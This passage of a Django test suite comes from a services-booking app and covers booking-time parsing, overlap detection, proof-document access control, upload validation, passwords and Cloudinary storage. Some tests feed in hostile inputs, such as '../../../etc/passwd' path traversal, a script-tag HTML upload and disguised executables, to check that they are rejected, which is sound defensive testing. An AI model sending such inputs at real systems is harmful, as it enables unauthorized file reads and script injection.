            source = self._source(name)
            with self.subTest(template=name):
                self.assertIn("{% url 'logout' %}", source)
                idx = source.find("{% url 'logout' %}")
                # The token sits inside the same <form>, just after the action.
                window = source[idx:idx + 300]
                self.assertIn('{% csrf_token %}', window)
                self.assertIn('method="POST"', source[max(0, idx - 200):idx])

    def test_no_template_tag_leaked_into_a_comment(self):
        # A literal tag inside a Django comment is still parsed and broke the
        # page once; guard against it coming back.
        for path in self.ROOT.rglob('*.html'):
            source = path.read_text(encoding='utf-8', errors='replace')
            for match in re.findall(r'\{#(.*?)#\}', source, re.S):
                with self.subTest(template=path.name):
                    self.assertNotIn('{%', match)



class AdminDashboardResponsiveSplitTest(SimpleTestCase):
    """The admin dashboard's "Recent Bookings | Top Workers" row set its 2fr/1fr
    split with an inline style, so no class rule could reach it. At 375px the
    two columns kept the desktop ratio and the whole page scrolled sideways
    (scrollWidth 529 vs clientWidth 375). It now carries a .dash-split class
    with a max-width:768px override, leaving >=768px untouched.
    """

    ROOT = Path(__file__).resolve().parent.parent

    def _template_source(self):
        return (self.ROOT / 'templates' / 'dashboards' / 'admin_dashboard.html').read_text(
            encoding='utf-8', errors='replace'
        )

    def _css_source(self):
        return (
            self.ROOT / 'lamoapp' / 'static' / 'css' / 'dashboards-admin_dashboard.css'
        ).read_text(encoding='utf-8', errors='replace')

    def test_split_row_carries_the_dash_split_class(self):
        source = self._template_source()
        rows = [
            line for line in source.splitlines()
            if 'grid-template-columns: 2fr 1fr' in line
        ]
        self.assertTrue(rows, 'the 2fr/1fr split row was not found')
        for line in rows:
            with self.subTest(line=line.strip()[:60]):
                self.assertIn('dash-split', line)

    def test_dash_split_collapses_to_one_column_on_small_screens(self):
        css = self._css_source()
        pattern = r'@media\s*\(max-width:\s*768px\)\s*\{\s*\.dash-split\s*\{[^}]*grid-template-columns:\s*1fr\s*!important'
        self.assertRegex(
            css, pattern,
            'no max-width:768px rule collapsing .dash-split to a single column',
        )

    def test_desktop_split_is_unchanged(self):
        # The fix must only add a small-screen override: the inline desktop
        # ratio stays exactly as it was.
        source = self._template_source()
        self.assertIn('grid-template-columns: 2fr 1fr', source)
        self.assertIn('gap: 24px', source)
        self.assertIn('margin-top: 30px', source)





# ============================================================
# P2-1 - BOOKING TIME PARSING / OVERLAP DETECTION
# ============================================================


class BookingTimeParsingTest(SimpleTestCase):
    """``parse_time_range`` must be deterministic: either a real window with
    ``end > start``, or ``(None, None)``. It must never fabricate a slot."""

    def test_previously_supported_formats_still_parse(self):
        expected = {
            '10:00 AM - 12:00 PM': (datetime_time(10, 0), datetime_time(12, 0)),
            '10:00 AM to 12:00 PM': (datetime_time(10, 0), datetime_time(12, 0)),
            '10:00 AM until 12:00 PM': (datetime_time(10, 0), datetime_time(12, 0)),
            '10:00AM': (datetime_time(10, 0), datetime_time(11, 0)),
            '10 AM': (datetime_time(10, 0), datetime_time(11, 0)),
            '10:00 AM': (datetime_time(10, 0), datetime_time(11, 0)),
            '22:00': (datetime_time(22, 0), datetime_time(23, 0)),
            '22:00:30': (datetime_time(22, 0, 30), datetime_time(23, 0, 30)),
            '12:00 AM': (datetime_time(0, 0), datetime_time(1, 0)),
        }
        for value, want in expected.items():
            with self.subTest(value=value):
                self.assertEqual(parse_time_range(value), want)

    def test_case_and_whitespace_tolerance_is_preserved(self):
        want = (datetime_time(10, 0), datetime_time(11, 0))
        for value in ('10:00 am', '  10:00 AM  ', '10:00 Am'):
            with self.subTest(value=value):
                self.assertEqual(parse_time_range(value), want)
        self.assertEqual(
            parse_time_range('  8:00 am  -  10:00 am '),
            (datetime_time(8, 0), datetime_time(10, 0)),
        )

    def test_unparseable_values_never_become_a_window(self):
        for value in (None, '', '   ', 'ASAP', 'garbage', '10', 'ten o clock',
                      '10:00 XM', '-', 'to', '10:00 AM - '):
            with self.subTest(value=value):
                start, end = parse_time_range(value)
                self.assertIsNone(start, value)
                self.assertIsNone(end, value)

    def test_zero_length_range_is_rejected(self):
        # "10:00 AM - 10:00 AM" has end == start. Treating it as a window would
        # make `start_time__lt=end AND end_time__gt=start` unsatisfiable, so the
        # booking would silently bypass conflict detection.
        start, end = parse_time_range('10:00 AM - 10:00 AM')
        self.assertIsNone(start)
        self.assertIsNone(end)

    def test_reversed_range_is_rejected_not_wrapped(self):
        start, end = parse_time_range('12:00 PM - 10:00 AM')
        self.assertIsNone(start)
        self.assertIsNone(end)

    def test_range_with_more_than_two_parts_is_rejected(self):
        # Only parts[0] and parts[1] are read below the split, so a value with
        # three or more parts would silently discard the tail and return a
        # partial window. It must be reported as unusable instead.
        for value in (
            '10:00 AM - 12:00 PM - 2:00 PM',
            '10:00-11:00-12:00',
            '10:00 AM to 12:00 PM until 2:00 PM',
        ):
            with self.subTest(value=value):
                start, end = parse_time_range(value)
                self.assertIsNone(start, value)
                self.assertIsNone(end, value)
                self.assertFalse(is_schedulable_time(value), value)

    def test_late_night_single_time_is_rejected_not_wrapped(self):
        # Previously "11:30 PM" became 23:30 -> 00:30, an inverted window that
        # could never match, so late-night slots skipped conflict detection.
        for value in ('11:30 PM', '11:59 PM', '23:30', '23:59'):
            with self.subTest(value=value):
                start, end = parse_time_range(value)
                self.assertIsNone(start, value)
                self.assertIsNone(end, value)

    def test_every_returned_window_has_end_after_start(self):
        samples = [
            '10:00 AM - 12:00 PM', '10:00 AM', '10:00AM', '10 AM', '22:00',
            '10:00 AM to 12:00 PM', '10:00 AM until 12:00 PM', '12:00 AM',
            '11:00 PM - 11:30 PM', '9:00 PM', '00:00', '6:00 AM - 8:00 AM',
            'ASAP', 'garbage', '11:30 PM', '10:00 AM - 10:00 AM',
        ]
        for value in samples:
            with self.subTest(value=value):
                start, end = parse_time_range(value)
                if start is None:
                    self.assertIsNone(end, value)
                else:
                    self.assertIsNotNone(end, value)
                    self.assertGreater(end, start, value)

    def test_is_schedulable_time(self):
        for good in ('10:00 AM - 12:00 PM', '10:00 AM', '22:00', '12:00 AM'):
            self.assertTrue(is_schedulable_time(good), good)
        for bad in (None, '', 'ASAP', 'garbage', '10:00 AM - 10:00 AM',
                    '12:00 PM - 10:00 AM', '11:30 PM'):
            self.assertFalse(is_schedulable_time(bad), bad)


class BookingOverlapDetectionTest(TestCase):
    """``has_worker_schedule_conflict`` uses the strict
    ``start_time__lt=end AND end_time__gt=start`` predicate. Boundary
    semantics are half-open intervals: back-to-back bookings are allowed."""

    def setUp(self):
        self.customer = _make_user('p2c1')
        self.service = Service.objects.create(
            name='P2OverlapSvc', description='d', price=Decimal('500.00'),
            is_active=True,
        )
        self.worker = WorkerProfile.objects.create(
            user=_make_user('p2w1', role='WORKER'),
            phone='9000000001', service=self.service, district='Ernakulam',
            work_status='AVAILABLE', is_verified=True,
        )
        self.day = date_type.today() + timedelta(days=3)

    def _existing(self, start, end, status='ACCEPTED'):
        return Booking.objects.create(
            customer=self.customer, worker=self.worker, service=self.service,
            date=self.day, time='existing', start_time=start, end_time=end,
            location='Kochi', phone='9000000001', status=status,
        )

    def _conflict(self, value):
        start, end = parse_time_range(value)
        return has_worker_schedule_conflict(
            self.worker, booking_date=self.day, start_time=start, end_time=end,
        )

    def test_exact_same_time_conflicts(self):
        self._existing(datetime_time(10, 0), datetime_time(12, 0))
        self.assertTrue(self._conflict('10:00 AM - 12:00 PM'))

    def test_partially_overlapping_conflicts(self):
        self._existing(datetime_time(10, 0), datetime_time(12, 0))
        self.assertTrue(self._conflict('11:00 AM - 1:00 PM'))
        self.assertTrue(self._conflict('9:00 AM - 11:00 AM'))

    def test_fully_contained_conflicts(self):
        self._existing(datetime_time(9, 0), datetime_time(17, 0))
        self.assertTrue(self._conflict('10:00 AM - 11:00 AM'))
        self.assertTrue(self._conflict('8:00 AM - 6:00 PM'))

    def test_non_overlapping_is_allowed(self):
        self._existing(datetime_time(10, 0), datetime_time(12, 0))
        self.assertFalse(self._conflict('2:00 PM - 4:00 PM'))
        self.assertFalse(self._conflict('6:00 AM - 8:00 AM'))

    def test_adjacent_boundary_is_allowed(self):
        # Half-open intervals: 10:00-11:00 then 11:00-12:00 do not overlap, so
        # a worker can be booked back-to-back. This is the pre-existing intent
        # of the predicate and is pinned here deliberately.
        self._existing(datetime_time(10, 0), datetime_time(11, 0))
        self.assertFalse(self._conflict('11:00 AM - 12:00 PM'))
        self.assertTrue(self._conflict('10:30 AM - 11:30 AM'))

    def test_cancelled_or_completed_bookings_do_not_block(self):
        self._existing(datetime_time(10, 0), datetime_time(12, 0),
                       status='CANCELLED')
        self.assertFalse(self._conflict('10:00 AM - 12:00 PM'))
        self._existing(datetime_time(10, 0), datetime_time(12, 0),
                       status='COMPLETED')
        self.assertFalse(self._conflict('10:00 AM - 12:00 PM'))

    def test_exclude_booking_id_ignores_itself(self):
        booking = self._existing(datetime_time(10, 0), datetime_time(12, 0))
        start, end = parse_time_range('10:00 AM - 12:00 PM')
        self.assertFalse(
            has_worker_schedule_conflict(
                self.worker, booking_date=self.day, start_time=start,
                end_time=end, exclude_booking_id=booking.id,
            )
        )

    def test_late_night_time_can_no_longer_bypass_checks(self):
        # Regression for the real defect: the OLD parser turned "11:30 PM" into
        # an inverted window, which made every conflict check vacuously false.
        self.assertFalse(is_schedulable_time('11:30 PM'))
        self._existing(datetime_time(10, 0), datetime_time(12, 0))
        start, end = parse_time_range('11:30 PM')
        self.assertIsNone(start)
        self.assertIsNone(end)

    def test_worker_leave_still_blocks_booking(self):
        from lamoapp.models import WorkerLeave as _WL

        _WL.objects.create(worker=self.worker, leave_date=self.day, reason='x')
        self.assertTrue(
            WorkerLeave.objects.filter(
                worker=self.worker, leave_date=self.day,
            ).exists()
        )


class BookingTimeRejectionTest(TestCase):
    """``book_service`` must reject an unusable time instead of silently
    degrading to exact-string matching."""

    def setUp(self):
        self.customer = _make_user('p2rc')
        self.service = Service.objects.create(
            name='P2RejectSvc', description='d', price=Decimal('500.00'),
            is_active=True,
        )
        self.worker = WorkerProfile.objects.create(
            user=_make_user('p2rw', role='WORKER'),
            phone='9000000002', service=self.service, district='Ernakulam',
            work_status='AVAILABLE', is_verified=True,
        )
        self.client.login(username=self.customer.username, password='Password123!')
        self.day = (date_type.today() + timedelta(days=4)).isoformat()

    def _book(self, time_value):
        # The booking modal posts with X-Requested-With, which is what makes
        # book_service answer with JSON instead of re-rendering the page.
        return self.client.post(
            reverse('book_service'),
            {
                'worker': self.worker.id, 'service': self.service.id,
                'date': self.day, 'time': time_value, 'location': 'Kochi',
                'phone': '9000000002', 'booking_type': 'One Time',
            },
            HTTP_X_REQUESTED_WITH='XMLHttpRequest',
        )

    def test_invalid_time_is_rejected_and_nothing_is_created(self):
        before = Booking.objects.count()
        for bad in ('garbage', '10:00 AM - 10:00 AM', '12:00 PM - 10:00 AM',
                    '11:30 PM'):
            with self.subTest(time=bad):
                response = self._book(bad)
                self.assertEqual(response.status_code, 400)
                payload = response.json()
                self.assertFalse(payload['success'])
                self.assertIn('valid time slot', payload['error_message'].lower())
        self.assertEqual(Booking.objects.count(), before)

    def test_valid_single_slot_is_accepted(self):
        response = self._book('10:00 AM')
        self.assertEqual(response.status_code, 200)
        self.assertTrue(response.json()['success'], response.content[:200])
        booking = Booking.objects.get()
        self.assertEqual(booking.start_time, datetime_time(10, 0))
        self.assertEqual(booking.end_time, datetime_time(11, 0))

    def test_valid_range_is_accepted(self):
        response = self._book('10:00 AM - 12:00 PM')
        self.assertEqual(response.status_code, 200)
        self.assertTrue(response.json()['success'], response.content[:200])
        booking = Booking.objects.get()
        self.assertEqual(booking.start_time, datetime_time(10, 0))
        self.assertEqual(booking.end_time, datetime_time(12, 0))

    def test_emergency_sentinel_is_not_schedulable(self):
        # Emergency bookings legitimately use a non-schedulable "ASAP" value;
        # the emergency flow keeps its own handling and must not regress.
        self.assertFalse(is_schedulable_time('ASAP'))

class ProofDocumentAccessTest(TestCase):
    """Regression tests for worker proof document access control."""

    def setUp(self):
        self.admin = CustomUser.objects.create_user(
            username='admin',
            email='admin@example.com',
            password='adminpass123',
            role='ADMIN',
        )
        self.customer = CustomUser.objects.create_user(
            username='customer',
            email='customer@example.com',
            password='custompass123',
            role='USER',
        )
        self.worker = CustomUser.objects.create_user(
            username='worker',
            email='worker@example.com',
            password='workpass123',
            role='WORKER',
        )

        # A proof document belonging to a DIFFERENT worker
        self.other_worker = CustomUser.objects.create_user(
            username='otherworker',
            email='other@example.com',
            password='otherpass123',
            role='WORKER',
        )
        self.other_worker_profile = WorkerProfile.objects.create(
            user=self.other_worker,
            phone='9876543210',
            service=None,
            proof_type='aadhaar',
            proof_document=SimpleUploadedFile(
                'proof_aadhaar.pdf',
                b'%PDF-1.4\ntest content',
                content_type='application/pdf',
            ),
            is_verified=True,
        )

        # A proof document belonging to self.worker
        self.worker_profile = WorkerProfile.objects.create(
            user=self.worker,
            phone='8765432109',
            service=None,
            proof_type='pan',
            proof_document=SimpleUploadedFile(
                'proof_pan.pdf',
                b'%PDF-1.4\ntest content',
                content_type='application/pdf',
            ),
            is_verified=True,
        )

        # A customer booking -> worker response context (not needed for these tests)

    def test_unauthenticated_user_denied(self):
        """Anonymous visitors are bounced to login and never get the file."""
        url = reverse('worker_proof_document', args=[self.worker_profile.pk])
        response = self.client.get(url)
        self.assertNotEqual(response.status_code, 200)
        self.assertEqual(response.status_code, 302)
        self.assertIn(reverse('login'), response['Location'])

    def test_customer_denied(self):
        """Customer must be denied."""
        self.client.force_login(self.customer)
        url = reverse('worker_proof_document', args=[self.worker_profile.pk])
        response = self.client.get(url)
        self.assertEqual(response.status_code, 403)

    def test_worker_denied(self):
        """Worker must be denied."""
        self.client.force_login(self.worker)
        url = reverse('worker_proof_document', args=[self.worker_profile.pk])
        response = self.client.get(url)
        self.assertEqual(response.status_code, 403)

    def test_worker_another_worker_denied(self):
        """Worker attempting another worker's document must be denied."""
        self.client.force_login(self.other_worker)
        url = reverse('worker_proof_document', args=[self.worker_profile.pk])
        response = self.client.get(url)
        self.assertEqual(response.status_code, 403)

    def test_admin_allowed(self):
        """Admin must be allowed, and the file is served as an attachment."""
        self.client.force_login(self.admin)
        url = reverse('worker_proof_document', args=[self.worker_profile.pk])
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        self.assertTrue(
            response['Content-Disposition'].startswith('attachment;')
        )

    def test_admin_nonexistent_document_404(self):
        """Admin requesting a nonexistent document must get 404."""
        self.client.force_login(self.admin)
        url = reverse('worker_proof_document', args=[99999])
        response = self.client.get(url)
        self.assertEqual(response.status_code, 404)

    def test_path_traversal_denied(self):
        """Traversal junk after the endpoint must not resolve to any file."""
        self.client.force_login(self.admin)
        response = self.client.get(
            reverse('worker_proof_document', args=[1]) + '../../../etc/passwd'
        )
        self.assertEqual(response.status_code, 404)

    def test_public_media_url_bypass_not_possible(self):
        """Direct /media/worker_proofs/... URLs are blocked server-side.

        The deny rule in lamo.urls is registered unconditionally, so the
        public media path never bypasses the admin-only endpoint - even
        for an unauthenticated request and even when media serving is on.
        """
        response = self.client.get('/media/worker_proofs/secret-proof.pdf')
        self.assertNotEqual(response.status_code, 200)
        self.assertEqual(response.status_code, 403)


class ProofDocumentUploadValidationTest(SimpleTestCase):
    """Upload validation for WorkerProfile.proof_document.

    Exercises the reusable validation in WorkerProfileForm (the
    profile-edit path); the worker-registration flow performs the same
    checks inline in views.register - see RegisterProofValidationTest.
    """

    def _clean(self, proof):
        from .forms import WorkerProfileForm
        form = WorkerProfileForm()
        form.cleaned_data = {'proof_document': proof}
        return form.clean_proof_document()

    def _rejects(self, proof):
        with self.assertRaises(DjangoValidationError):
            self._clean(proof)

    def test_valid_pdf_accepted(self):
        out = self._clean(SimpleUploadedFile(
            'proof.pdf', b'%PDF-1.4 ok', content_type='application/pdf',
        ))
        self.assertTrue(out.name.endswith('.pdf'))

    def test_valid_jpeg_accepted(self):
        out = self._clean(SimpleUploadedFile(
            'photo.jpg', b'\xFF\xD8\xFF\xE0 rest', content_type='image/jpeg',
        ))
        self.assertTrue(out.name.endswith('.jpg'))

    def test_valid_png_accepted(self):
        out = self._clean(SimpleUploadedFile(
            'scan.png', b'\x89PNG\r\n\x1a\nrest', content_type='image/png',
        ))
        self.assertTrue(out.name.endswith('.png'))

    def test_stored_name_is_random_uuid_not_client_name(self):
        out = self._clean(SimpleUploadedFile(
            'My Aadhaar Card.PDF', b'%PDF-1.4 ok', content_type='application/pdf',
        ))
        base = out.name.rsplit('/', 1)[-1]
        self.assertNotIn('My Aadhaar', base)
        self.assertTrue(re.fullmatch(r'[0-9a-f]{32}\.pdf', base))

    def test_oversized_proof_rejected(self):
        big = b'%PDF-' + b'0' * (5 * 1024 * 1024)
        self._rejects(SimpleUploadedFile(
            'big.pdf', big, content_type='application/pdf',
        ))

    def test_unsupported_extension_rejected(self):
        self._rejects(SimpleUploadedFile(
            'notes.txt', b'plain text', content_type='text/plain',
        ))

    def test_executable_extension_rejected(self):
        self._rejects(SimpleUploadedFile(
            'tool.exe', b'MZ\x90\x00', content_type='application/octet-stream',
        ))

    def test_html_rejected(self):
        self._rejects(SimpleUploadedFile(
            'page.html', b'<html><script>alert(1)</script></html>',
            content_type='text/html',
        ))

    def test_svg_rejected(self):
        self._rejects(SimpleUploadedFile(
            'img.svg', b'<svg xmlns="http://www.w3.org/2000/svg"></svg>',
            content_type='image/svg+xml',
        ))

    def test_double_extension_trailing_executable_rejected(self):
        self._rejects(SimpleUploadedFile(
            'scan.pdf.exe', b'MZ\x90', content_type='application/octet-stream',
        ))

    def test_double_extension_inner_executable_rejected(self):
        # Final extension is allowed, but an inner dangerous part is not.
        self._rejects(SimpleUploadedFile(
            'payload.exe.pdf', b'%PDF-1.4 ok', content_type='application/pdf',
        ))

    def test_path_traversal_filename_rejected(self):
        proof = SimpleUploadedFile(
            'evil.pdf', b'%PDF-1.4 ok', content_type='application/pdf',
        )
        # Django strips path components in UploadedFile.name; use the
        # underlying attribute to simulate a bypass so our own guard
        # is what the test exercises.
        proof._name = '../../etc/passwd.pdf'
        self._rejects(proof)

    def test_extension_content_mismatch_rejected(self):
        # Declared as PDF, but the actual bytes are an executable header.
        self._rejects(SimpleUploadedFile(
            'fake.pdf', b'MZ\x90\x00\x03', content_type='application/pdf',
        ))


class RegisterProofValidationTest(TestCase):
    """The worker-registration flow rejects bad proofs without a 500."""

    def _payload(self, proof, username='proofreg1'):
        service = Service.objects.create(
            name='RegProofSvc', description='d',
            price=Decimal('500.00'), is_active=True,
        )
        return {
            'username': username, 'email': username + '@t.com',
            'password': 'Password123!', 'confirm_password': 'Password123!',
            'role': 'WORKER',
            'phone': '9876543219',
            'service': str(service.id),
            'experience_years': '5',
            'district': 'Ernakulam',
            'availability': 'Full Time',
            'pricing_type': 'hour',
            'pricing_amount': '500',
            'address': 'Kakkanad, Kochi, Kerala',
            'proof_type': 'aadhaar',
            'proof_document': proof,
        }

    def test_executable_proof_rejected_gracefully(self):
        proof = SimpleUploadedFile(
            'evil.exe', b'MZ\x90\x00', content_type='application/octet-stream',
        )
        response = self.client.post(reverse('register'), self._payload(proof))
        # Friendly re-render (200), never an unhandled 500.
        self.assertEqual(response.status_code, 200)
        self.assertFalse(
            CustomUser.objects.filter(username='proofreg1').exists()
        )

    def test_valid_proof_registers_worker(self):
        proof = SimpleUploadedFile(
            'ok.pdf', b'%PDF-1.4 ok', content_type='application/pdf',
        )
        response = self.client.post(reverse('register'), self._payload(proof))
        self.assertEqual(response.status_code, 302)
        self.assertTrue(
            CustomUser.objects.filter(username='proofreg1').exists()
        )


class BookingLocationUnicodeTest(TestCase):
    """Malayalam location strings must round-trip through book_service byte-faithfully.

    Regression test for the Worker Dashboard ``???`` corruption: the stored
    ``Booking.location`` once contained literal ASCII ``?`` runs where the
    Nominatim ``display_name`` carried Malayalam script. The connection is
    utf8mb4 now, so a Unicode location posted through the real booking path
    must be stored exactly as submitted, with no ``?`` replacement.
    """

    def test_malayalam_location_round_trips_through_book_service(self):
        customer = _make_user('unicode_location_customer')
        service = Service.objects.create(
            name='UnicodeLocSvc',
            description='unicode location round-trip',
            price=Decimal('500.00'),
            is_active=True,
        )
        worker = _make_worker('unicode_location_worker', service)

        # Harmless synthetic string: Malayalam words + ASCII street/city parts.
        # Uses the existing helper factories; no real customer PII.
        unicode_location = (
            'Test House, \u0d15\u0d4a\u0d1f\u0d4d\u0d1f\u0d3e\u0d30\u0d15\u0d4d\u0d15\u0d30'
            ' (\u0d2a\u0d3e\u0d7c\u0d24\u0d4d\u0d24\u0d3f\u0d2d \u0d1c\u0d02\u0d15\u0d4d\u0d37\u0d7b), '
            'Kollam, Kerala 691001'
        )

        self.client.login(username='unicode_location_customer', password='Password123!')
        response = self.client.post(reverse('book_service'), {
            'worker': worker.id,
            'service': service.id,
            'booking_type': 'One Time',
            'date': _future_date_str(30),
            'time': '10:00-12:00',
            'location': unicode_location,
            'phone': '9876543210',
            'description': 'unicode round-trip check',
        })

        self.assertEqual(response.status_code, 302)
        booking = Booking.objects.get(customer=customer)
        # 1 + 2: created successfully and stored value matches exactly.
        self.assertEqual(booking.location, unicode_location)
        # 3: no ASCII replacement characters were introduced.
        self.assertNotIn('?', booking.location)
        # 4: UTF-8 round-trip preserved — refresh and re-encode losslessly.
        booking.refresh_from_db()
        self.assertEqual(
            booking.location.encode('utf-8').decode('utf-8'),
            unicode_location,
        )

    def test_booking_form_declares_utf8_charset(self):
        html = Path(
            settings.BASE_DIR, 'templates', 'user', 'book_service.html'
        ).read_text(encoding='utf-8')
        self.assertIn('accept-charset="UTF-8"', html)


class PasswordValidationTest(TestCase):
    """Registration + reset must enforce AUTH_PASSWORD_VALIDATORS.

    Previously only a length>=8 check ran, so 'password123' or
    '12345678' were accepted. validate_password() is now applied in
    register_view (USER + WORKER share the path) and
    forgot_password_view reset branch, after the existing
    confirmation/length checks.
    """

    def _user_payload(self, username, password, confirm=None):
        return {
            'username': username, 'email': username + '@t.com',
            'password': password,
            'confirm_password': password if confirm is None else confirm,
            'role': 'USER',
        }

    def test_valid_password_registers_and_starts_otp_flow(self):
        response = self.client.post(
            reverse('register'), self._user_payload('pwdok1', 'Password123!')
        )
        self.assertEqual(response.status_code, 302)
        self.assertEqual(response['Location'], reverse('verify_otp'))
        user = CustomUser.objects.get(username='pwdok1')
        self.assertTrue(user.check_password('Password123!'))
        self.assertIsNotNone(user.email_verification_otp)

    def test_short_password_rejected(self):
        response = self.client.post(
            reverse('register'), self._user_payload('pwdshort1', 'Ab1!')
        )
        self.assertEqual(response.status_code, 200)
        self.assertFalse(
            CustomUser.objects.filter(username='pwdshort1').exists()
        )

    def test_common_password_rejected(self):
        response = self.client.post(
            reverse('register'), self._user_payload('pwdcommon1', 'password123')
        )
        self.assertEqual(response.status_code, 200)
        self.assertFalse(
            CustomUser.objects.filter(username='pwdcommon1').exists()
        )
        self.assertContains(response, 'This password is too common.')

    def test_numeric_only_password_rejected(self):
        response = self.client.post(
            reverse('register'), self._user_payload('pwdnum1', '12345678')
        )
        self.assertEqual(response.status_code, 200)
        self.assertFalse(
            CustomUser.objects.filter(username='pwdnum1').exists()
        )
        self.assertContains(response, 'This password is entirely numeric.')

    def test_confirmation_mismatch_still_rejected(self):
        response = self.client.post(
            reverse('register'),
            self._user_payload('pwdmis1', 'Password123!', confirm='Other123!x'),
        )
        self.assertEqual(response.status_code, 200)
        self.assertFalse(
            CustomUser.objects.filter(username='pwdmis1').exists()
        )
        self.assertContains(response, 'Passwords do not match.')

    def test_worker_weak_password_rejected_before_file_checks(self):
        service = Service.objects.create(
            name='PwdValSvc', description='d',
            price=Decimal('500.00'), is_active=True,
        )
        proof = SimpleUploadedFile(
            'ok.pdf', b'%PDF-1.4 ok', content_type='application/pdf',
        )
        response = self.client.post(reverse('register'), {
            'username': 'pwdworker1', 'email': 'pwdworker1@t.com',
            'password': 'password123', 'confirm_password': 'password123',
            'role': 'WORKER',
            'phone': '9876543221',
            'service': str(service.id),
            'experience_years': '5',
            'district': 'Ernakulam',
            'availability': 'Full Time',
            'pricing_type': 'hour',
            'pricing_amount': '500',
            'address': 'Kakkanad, Kochi, Kerala',
            'proof_type': 'aadhaar',
            'proof_document': proof,
        })
        self.assertEqual(response.status_code, 200)
        self.assertFalse(
            CustomUser.objects.filter(username='pwdworker1').exists()
        )

    def test_password_reset_accepts_valid_password(self):
        user = _make_user('pwdresetok')
        token = user.generate_password_reset_token()
        old_hash = user.password
        response = self.client.post(
            reverse('forgot_password') + '?uid=%s&token=%s' % (user.pk, token),
            {'password': 'NewPass123!x', 'confirm_password': 'NewPass123!x'},
        )
        self.assertEqual(response.status_code, 302)
        user.refresh_from_db()
        self.assertNotEqual(user.password, old_hash)
        self.assertTrue(user.check_password('NewPass123!x'))

    def test_password_reset_rejects_common_password_without_saving(self):
        user = _make_user('pwdresetbad')
        token = user.generate_password_reset_token()
        old_hash = user.password
        response = self.client.post(
            reverse('forgot_password') + '?uid=%s&token=%s' % (user.pk, token),
            {'password': 'password123', 'confirm_password': 'password123'},
        )
        self.assertEqual(response.status_code, 200)
        user.refresh_from_db()
        self.assertEqual(user.password, old_hash)
        self.assertFalse(user.check_password('password123'))
        self.assertContains(response, 'This password is too common.')
        self.assertTrue(response.context['reset_mode'])
        self.assertEqual(str(response.context['uid']), str(user.pk))
        self.assertEqual(response.context['token'], token)


class PrefixCloudinaryStorageTest(TestCase):
    """Default storage routes public images to Cloudinary, proofs stay local.

    All Cloudinary SDK calls are mocked - no network, no credentials. The
    dummy values below are syntactically-shaped placeholders, never real
    secrets.
    """

    CLOUDINARY_SETTINGS = {
        'CLOUDINARY_CLOUD_NAME': 'test-cloud',
        'CLOUDINARY_API_KEY': '123456789012345',
        'CLOUDINARY_API_SECRET': 'test-secret-not-a-real-credential',
    }

    def _storage(self):
        from django.core.files.storage import default_storage
        return default_storage

    def _tiny_gif(self, name='tiny.gif'):
        # 1x1 GIF: Pillow-valid so ImageField validation passes.
        return SimpleUploadedFile(
            name,
            b'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00'
            b'\xff\xff\xff!\xf9\x04\x01\x00\x00\x00\x00,'
            b'\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;',
            content_type='image/gif',
        )

    @override_settings(**CLOUDINARY_SETTINGS)
    def test_public_prefixes_route_to_cloudinary(self):
        """services/, workers/, users/ upload via the Cloudinary API."""
        import sys
        from unittest.mock import MagicMock, patch
        from django.test.utils import override_settings as _override

        storage = self._storage()
        self.assertEqual(
            storage.__class__.__name__, 'PrefixCloudinaryStorage',
        )
        fake_sdk = MagicMock()
        with patch.dict(sys.modules, {'cloudinary': fake_sdk}):
            with tempfile.TemporaryDirectory() as tmp:
                with _override(MEDIA_ROOT=tmp):
                    for prefix in ('services/', 'workers/', 'users/'):
                        name = storage.save(
                            prefix + 'pic.gif', self._tiny_gif(),
                        )
                        # Django joins upload_to with os.sep (backslash on
                        # Windows); compare separator-insensitively.
                        self.assertTrue(
                            name.replace('\\', '/').startswith(prefix)
                        )
        # One SDK upload per public prefix; never overwrite in place.
        self.assertEqual(fake_sdk.uploader.upload.call_count, 3)
        for call in fake_sdk.uploader.upload.call_args_list:
            _, kwargs = call
            self.assertFalse(kwargs.get('overwrite', True))
            self.assertTrue(kwargs.get('unique_filename', False))
        # The secret may only reach cloudinary.config(), never uploader.
        for call in fake_sdk.uploader.upload.call_args_list:
            self.assertNotIn(
                'test-secret-not-a-real-credential', repr(call),
            )

    @override_settings(**CLOUDINARY_SETTINGS)
    def test_proof_prefix_always_stays_local(self):
        """worker_proofs/ never touches the Cloudinary SDK."""
        import sys
        from unittest.mock import MagicMock, patch
        from django.test.utils import override_settings as _override

        storage = self._storage()
        fake_sdk = MagicMock()
        with patch.dict(sys.modules, {'cloudinary': fake_sdk}):
            with tempfile.TemporaryDirectory() as tmp:
                with _override(MEDIA_ROOT=tmp):
                    name = storage.save(
                        'worker_proofs/proof.pdf',
                        SimpleUploadedFile(
                            'proof.pdf', b'%PDF-1.4 ok',
                            content_type='application/pdf',
                        ),
                    )
                    self.assertTrue(
                        os.path.exists(os.path.join(tmp, name))
                    )
        fake_sdk.uploader.upload.assert_not_called()
        fake_sdk.api.resource.assert_not_called()

    def test_unconfigured_stays_local_without_sdk(self):
        """No credentials -> everything local, cloudinary never imported."""
        import sys
        from django.test.utils import override_settings as _override

        # settings_test.py already blanks the credentials; assert locally.
        self.assertFalse(settings.CLOUDINARY_CLOUD_NAME)
        self.assertFalse(settings.CLOUDINARY_API_KEY)
        self.assertFalse(settings.CLOUDINARY_API_SECRET)
        storage = self._storage()
        with tempfile.TemporaryDirectory() as tmp:
            with _override(MEDIA_ROOT=tmp):
                name = storage.save('services/local.gif', self._tiny_gif())
                self.assertTrue(os.path.exists(os.path.join(tmp, name)))
                self.assertTrue(
                    storage.url(name).startswith(settings.MEDIA_URL)
                )
        self.assertNotIn('cloudinary', sys.modules)

    @override_settings(**CLOUDINARY_SETTINGS)
    def test_partial_credentials_stay_local(self):
        """A missing secret disables Cloudinary (fail-closed to disk)."""
        from django.test.utils import override_settings as _override

        storage = self._storage()
        with tempfile.TemporaryDirectory() as tmp:
            with _override(MEDIA_ROOT=tmp, CLOUDINARY_API_SECRET=''):
                name = storage.save('users/me.gif', self._tiny_gif())
                self.assertTrue(os.path.exists(os.path.join(tmp, name)))

    @override_settings(**CLOUDINARY_SETTINGS)
    def test_public_id_strips_extension_and_normalises(self):
        from lamoapp.cloudinary_storage import _public_id_for
        self.assertEqual(
            _public_id_for('services/plumbing.jpg'), 'services/plumbing',
        )
        self.assertEqual(
            _public_id_for('\\workers\\photo.PNG'), 'workers/photo',
        )
        self.assertEqual(
            _public_id_for('/users/avatar.webp'), 'users/avatar',
        )

    @override_settings(**CLOUDINARY_SETTINGS)
